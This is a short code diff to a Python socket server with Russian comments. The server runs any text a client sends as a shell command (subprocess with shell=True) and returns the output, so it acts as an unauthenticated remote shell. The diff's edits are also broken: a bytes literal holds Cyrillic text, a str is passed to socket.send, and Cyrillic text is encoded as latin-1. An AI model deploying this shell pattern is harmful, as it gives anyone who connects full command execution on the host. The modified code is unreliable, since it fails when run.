@@ -13,17 +13,21 @@ def handle_client(client_socket):
     
     while True:
         # Получаем команду от клиента
-        command = client_socket.recv(1024).decode('utf-8').strip()
+        command = client_socket.recv(1024).decode('latin-1').strip()
         if command.lower() == 'exit':
             break
+
+        if not command:  # Проверка на пустую команду
+            client_socket.send(b"Ошибка: Пустая команда\n")
+            continue
 
         # Выполняем команду и отправляем результат обратно
         try:
             # Используем subprocess для выполнения команды
             output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            client_socket.send(output + b"\n")
+            client_socket.send(output.decode('latin-1') + "\n")
         except subprocess.CalledProcessError as e:
-            client_socket.send(f"Ошибка: {e.output.decode('utf-8')}\n".encode('utf-8'))
+            client_socket.send(f"Ошибка: Команда '{command}' завершилась с кодом {e.returncode}\n".encode('latin-1'))
 
     client_socket.close()
     print("Клиент отключен")
